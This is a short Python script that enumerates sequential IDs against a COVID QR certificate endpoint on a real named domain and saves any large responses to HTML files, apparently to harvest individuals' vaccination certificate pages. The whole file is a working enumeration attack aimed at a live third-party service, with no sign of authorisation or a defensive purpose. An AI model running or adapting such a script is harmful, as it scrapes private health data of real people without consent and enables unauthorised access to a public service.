#!/usr/bin/env python3
import os
import requests
from pathlib import Path
URL = "https://vcim.am/covidqr/?covidqr="
DATA = 227600110998
STEP = 1000000

def send_request():
    url = URL + str(DATA)
    print("Request URL: %s" % url)
    try:
        response = requests.post(url,
                                 verify = True)
    except:
        print("\033[31;4mVCIM server is offline\033[0m.")
        return
    data = response.text
    if len(data) > 72092:
        with open("%s.html" % DATA, "w") as f:
            f.write(data)

def parse_data(key):
    global DATA
    count = 0
    path = "tests/%s" % key
    Path(path).mkdir(parents = True,
                     exist_ok = True)
    os.chdir(path)
    data_list = list(str(DATA))
    data_list[3] = str(key)
    DATA = int("".join(data_list))
    while True:
        if count == 100:
            break
        send_request()
        DATA += STEP
        count += 1

parse_data(8)
